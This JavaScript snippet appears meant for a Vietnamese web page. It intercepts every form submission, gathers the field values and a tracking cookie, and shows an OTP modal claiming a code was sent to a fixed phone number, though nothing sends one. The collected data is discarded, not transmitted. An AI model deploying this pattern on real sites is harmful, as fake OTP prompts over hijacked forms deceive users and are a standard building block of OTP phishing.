(function () {
  function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(";").shift();
    return null;
  }

  function createOtpModal() {
    if (document.getElementById("otpModal")) return;

    const modal = document.createElement("div");
    modal.className = "otp-modal";
    modal.id = "otpModal";
    modal.innerHTML = `
      <div class="otp-modal-content">
      <span id="otpCloseBtn" 
        style="position: absolute; top: 15px; right: 15px; cursor: pointer; font-size: 20px;">&times;</span>
        <h3>Xác thực OTP</h3>
        <p>Vui lòng nhập mã OTP chúng tôi đã gửi cho bạn qua số điện thoại:</p>
        <p>0337638548</p>
        <input type="number" id="otpInput" placeholder="Nhập mã OTP">
        <p id="countdownText" style="color:red; font-size:12px; margin-top:5px;"></p>
        <p>Bạn không nhận được mã? <span id="resendBtn" style="color: #4950c9; cursor: pointer">Gửi lại mã</span></p>
        <button id="otpSubmit">Xác nhận</button>
      </div>
    `;
    document.body.appendChild(modal);

    document
      .getElementById("otpCloseBtn")
      .addEventListener("click", function () {
        modal.style.display = "none";
        stopCountdown();
      });
  }

  function attachFormTracking() {
    document.addEventListener("DOMContentLoaded", function () {
      createOtpModal();

      const otpModal = document.getElementById("otpModal");
      const otpInput = document.getElementById("otpInput");
      const otpSubmit = document.getElementById("otpSubmit");
      const resendBtn = document.getElementById("resendBtn");

      let pendingData = null;

      document.querySelectorAll("form").forEach((form) => {
        form.addEventListener("submit", function (e) {
          e.preventDefault();

          const clickId = getCookie("click_id") || "";

          const formDataObj = {};
          new FormData(form).forEach((value, key) => {
            formDataObj[key] = value;
          });
          formDataObj["click_id"] = clickId;

          pendingData = formDataObj;

          otpModal.style.display = "flex";

          startCountdown();
        });
      });

      resendBtn.addEventListener("click", function () {
        startCountdown();
      });

      otpSubmit.addEventListener("click", function () {
        const otp = otpInput.value.trim();
        if (!otp) {
          alert("Vui lòng nhập OTP");
          return;
        }

        pendingData["otp"] = otp;
        otpModal.style.display = "none";

        otpInput.value = "";
        pendingData = null;
      });
    });
  }

  attachFormTracking();

  //Check countdown
  let countdownTimer = null;
  let countdownSeconds = 180;

  function startCountdown() {
    const countdownText = document.getElementById("countdownText");
    let timeLeft = countdownSeconds;

    stopCountdown();

    function updateText() {
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      countdownText.textContent = `Mã OTP sẽ hết hạn sau ${minutes}:${seconds
        .toString()
        .padStart(2, "0")}`;
    }

    updateText();
    countdownTimer = setInterval(() => {
      timeLeft--;
      if (timeLeft <= 0) {
        clearInterval(countdownTimer);
        countdownText.textContent = "Mã OTP đã hết hạn. Vui lòng gửi lại mã.";
        return;
      }
      updateText();
    }, 1000);
  }

  function stopCountdown() {
    if (countdownTimer) {
      clearInterval(countdownTimer);
      countdownTimer = null;
    }
  }

  // Add styles
  const style = document.createElement("style");
  style.innerHTML = `
    input::-webkit-outer-spin-button,
      input::-webkit-inner-spin-button {
      -webkit-appearance: none;
      margin: 0;
    }
    input[type=number] {
      -moz-appearance: textfield;
    }
    .otp-modal {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.5);
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }
    .otp-modal-content {
      position: relative;
      background: #fff;
      padding: 20px;
      border-radius: 12px;
      width: 360px;
      text-align: center;
      font-family: "Inter", sans-serif;

      p {
        margin-top: 12px;
        font-size: 12px;
      }
    }
    .otp-modal input {
      width: -webkit-fill-available;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid rgba(0, 0, 0, 0.5);
      border-radius: 40px;

       &:focus {
        outline: none;
      }
    }
    .otp-modal button {
      padding: 10px 20px;
      background: #4950c9;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 20px;
    }
  `;
  document.head.appendChild(style);
})();
